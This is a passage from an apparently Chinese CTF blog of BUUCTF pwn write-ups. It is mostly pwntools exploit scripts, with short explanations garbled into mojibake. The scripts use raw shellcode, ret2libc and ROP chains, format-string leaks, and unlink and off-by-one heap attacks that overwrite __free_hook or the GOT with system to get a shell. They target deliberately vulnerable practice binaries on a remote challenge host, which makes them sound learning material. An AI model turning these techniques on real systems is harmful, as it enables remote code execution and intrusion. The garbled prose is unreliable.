esp,40;call esp&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(call)<br>r.sendline(sc.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(jmp_esp)+call)<br><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-shellcode">picoctf_2018_shellcode</h3><p>è¿™é‡Œè®©æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ç›´æ¥æ˜¯retçš„åœ°å€ï¼Œä¸”æ²¡å¼€nxï¼Œç›´æ¥ç”¨shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29624</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="npuctf-2020-easyheap">npuctf_2020_easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25288</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------------</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0x41</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x8</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#-----------------------------------------------</span><br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#obj=LibcSearcher(&#x27;free&#x27;,addr)</span><br>base=addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#----------------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme2">cmcc_pwnme2</h3><p>è¿™é¢˜åŸæœ¬add_home,add_flagä¸ºçš„æ˜¯åœ¨bssæ®µçš„stringé‡Œå†™å…¥/home/flagç„¶ååˆ©ç”¨exec_stringè¯»å–flag</p><p>ä½†åœ¨buué‡Œè·¯å¾„flagå°±å¯ä»¥è¯»å–</p><p>ä¸èƒ½ç”¨add_flagå»å¡«stringä¼šå¡«å…¥/flag(ä¸åŒäºflag,æˆ‘çŒœ)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27836</span>)<br>puts_plt=<span class="hljs-number">0x8048440</span><br>exec_string=<span class="hljs-number">0x80485cb</span><br>string=<span class="hljs-number">0x804a060</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(puts_plt)+p32(exec_string)+p32(string))<br>r.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="x-ctf-b0verfl0w">x_ctf_b0verfl0w</h3><p>åˆæ˜¯é‡åˆ°è¿™ç§é¢˜ç›®ï¼Œè¿˜æ˜¯ç”¨jmp_espè·³åˆ°æ ˆä¸Šæ‰§è¡Œshellcodeçš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25252</span>)<br><span class="hljs-comment">#r=process(&#x27;./b0verfl0w&#x27;)</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>pd=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br>pd=pd.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>jmp_esp=<span class="hljs-number">0x08048504</span><br>pd+=p32(jmp_esp)+asm(<span class="hljs-string">&#x27;sub esp,0x28;call esp&#x27;</span>)<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-leak-me">picoctf_2018_leak_me</h3><p>å¯ä»¥å­¦åˆ°äº†ï¼Œå‚è€ƒè¿™ä½å¸ˆå‚…<a href="https://blog.csdn.net/weixin_51298357/article/details/113420616">picoctf_2018_leak_me_ç™½æ—¥æ¢¦-æƒ³å®¶çš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™é“é¢˜ä¸€å¼€å§‹F5ä¸èƒ½æ˜¾ç¤ºä¼ªä»£ç ã€‚ä¼šæ˜¾ç¤ºåˆæœ‰ä¸ªåœ°æ–¹æœ‰é—®é¢˜ï¼Œå¿«æ·é”®gè¾“å…¥æœ‰é—®é¢˜çš„åœ°æ–¹çš„åœ°å€ï¼Œç„¶åç‚¹è¿›å»å…ˆåç¼–è¯‘æœ‰é—®é¢˜çš„è¿™ä¸ªå‡½æ•°ï¼Œç„¶åå†å‡ºæ¥åç¼–è¯‘æ•´ä¸ªå‡½æ•°å°±å¥½äº†</p><p>putsæ˜¯ç”¨\x00åˆ†éš”çš„ï¼Œå¯†ç ä¸nameç›¸è¿ï¼Œç›¸å·®0x100è·ç¦»ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠ\x00å¡«æ»¡ï¼Œputså°±èƒ½å¸¦å‡ºpasswordäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27410</span>)<br><br>r.sendline(<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-basic-pwn">suctf_2018_basic pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27295</span>)r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401157</span>))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme1">cmcc_pwnme1</h3><p>è¿™é¢˜æ²¡æ‰¾åˆ°jmp rsp ç”¨ret2libcåš</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26781</span>)libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)elf = ELF(<span class="hljs-string">&#x27;./pwnme1&#x27;</span>)r.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p32(<span class="hljs-number">0x8048624</span>)+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))puts_got=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)libc_base=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]og=libc_base+0x3a812r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(og))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-heap">axb_2019_heap</h3><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362">buuctf axb_2019_heap_R1nd0çš„åšå®¢-CSDNåšå®¢</a></p><p>ä¿æŠ¤å…¨å¼€ï¼Œä½†è¿™é¢˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¹Ÿå¯ä»¥off by one</p><p><strong>å…·ä½“åšæ³•ï¼š</strong></p><p>1.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²ç¨‹åºåŸºå€å’ŒlibcåŸºå€</p><p>ï¼ˆè¦æœ‰ç¨‹åºåŸºå€æ‰èƒ½å¾—åˆ°bssæ®µçš„åœ°å€ï¼‰</p><p>ä¾‹ï¼šå¦‚ä½•å¾—åˆ°15çš„åç§»ï¼Œå…ˆgdbå¡«%p%p%p%p%p%p%p%p%p%pï¼Œæµ‹å‡ºè¾“å…¥å˜é‡çš„åç§»ä¸º7</p><p>å†è°ƒè¯•ï¼Œè¾“å…¥8ä¸ªaï¼Œåœ¨printf(&amp;format)è¿™é‡Œåœä¸‹ï¼Œçœ‹æ ˆï¼Œ__libc_start_main+240çš„è·ç¦»åç§»ä¸º8</p><p>8+7=15</p><p>2.åˆ©ç”¨off-by-oneä¼ªé€ chunkï¼Œfreeè§¦å‘unlinkï¼Œä½¿chunk0æŒ‡é’ˆæŒ‡å‘å®ƒçš„-0x18å¤„</p><p>3.ç”±äºgotè¡¨ä¸å¯æ”¹å†™ï¼Œæ‰€ä»¥è¦†ç›–hookå‡½æ•°ï¼Œï¼Œè¿™é‡ŒæŠŠ__free_hookæ”¹ä¸ºsystemçš„åœ°å€</p><p>4.è¿˜å·®/bin/shï¼Œå¹¶ä¸èƒ½ç›´ç™½çš„å¡«/bin/shï¼Œè€Œæ˜¯è¦å¡«å®ƒæ‰€åœ¨åœ°å€æ‰€ä»¥é‚£é‡Œè¦å†™p64(note+0x18)+â€œ/bin/sh\x00â€</p><p><strong>åšé¢˜æ—¶é‡åˆ°çš„é—®é¢˜ï¼š</strong></p><p>1.å‘ç°è¿›å…¥å‡½æ•°è°ƒè¯•éƒ½ä¸ä¼šè°ƒè¯•éƒ½ä¸ä¼šorzï¼Œå‚è€ƒå¸ˆå‚…<a href="https://www.cnblogs.com/zhwer/p/12494317.html">gdb/pwndbg å¸¸ç”¨å‘½ä»¤ç®€å•æ•´ç† - æš–æš–è‰æœ - åšå®¢å›­ (cnblogs.com)</a>ï¼Œs  è¿›å…¥å‡½æ•°è°ƒè¯•</p><p>2.çœ‹é‚£ä¸ªæœ‰æ¼æ´çš„get_inputå‡½æ•°çœ‹çš„æˆ‘å¾ˆæ‡µï¼Œè¿˜æœ‰é‚£ä¸ª*((_QWORD *)&amp;note + 2 * v0) = malloc((unsigned int)size);<br>*((_DWORD *)&amp;note + 4 * SHIDWORD(size) + 2) = size;ä¹Ÿçœ‹çš„å¾ˆè¿·ç³Š</p><p>2.è¿™é¢˜æˆ‘ä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜ï¼Œå°±æ˜¯è¦è¾“contenté‚£é‡Œï¼Œæ°¸è¿œä¼šè®©æˆ‘go outï¼Œæœ¬åœ°æ‰“é€šä¸äº†ï¼Œåªèƒ½å­¦å­¦æ€è·¯æ‰“è¿œç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_heap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29472</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;):&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>        sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Enter the content: \n&#x27;</span>,content)<br><span class="hljs-comment">#---------------------------------------        </span><br>ru(<span class="hljs-string">&#x27;Enter your name: &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;%15$p%19$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>addr1=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)<br>libc_base=addr1-<span class="hljs-number">240</span>-libc.symbols[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>addr2=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>base=addr2-<span class="hljs-number">0x116a</span><br>note=base+<span class="hljs-number">0x202060</span><br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x90</span>)<br>fake_chunk+=p64(note-<span class="hljs-number">0x18</span>)+p64(note-<span class="hljs-number">0x10</span>)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>fake_chunk+=p64(<span class="hljs-number">0x90</span>)+p8(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(free_hook)+p64(<span class="hljs-number">0x38</span>)+p64(note+<span class="hljs-number">0x18</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babystack">actf_2019_babystack</h3><p>è¿™é¢˜åªèƒ½æº¢å‡º0xe0-0xd0=0x10</p><p>ä½†è¿™é¢˜ç»™å‡ºäº†æ ˆä¸­å˜é‡æ‰€åœ¨çš„åœ°å€ï¼Œç”¨<strong>æ 